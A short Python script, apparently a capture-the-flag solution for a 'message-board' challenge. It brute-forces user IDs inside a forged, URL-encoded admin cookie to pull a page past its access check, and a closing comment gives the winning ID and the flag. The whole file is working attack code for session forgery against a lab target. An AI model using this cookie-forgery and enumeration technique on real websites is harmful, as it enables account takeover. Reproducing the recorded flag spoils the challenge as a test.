import requests

url = 'https://message-board.hsc.tf'
for i in range(450,1000):
    if len(str(i))==1: a = "00"+str(i)
    elif len(str(i))==2: a = "0"+str(i)
    else: a = str(i)
    c = 'j%3A%7B%22userID%22%3A%22'+a+'%22%2C%22username%22%3A%22admin%22%7D'
    r = requests.get(url, cookies={'userData':c})
    if "no flag for you" in r.text: d=1
    else:
        print(r.text)
        usr = input("found: ")
    print(i)
    if i%50==0: print(r.text)
    

# 767, flag{y4m_y4m_c00k13s}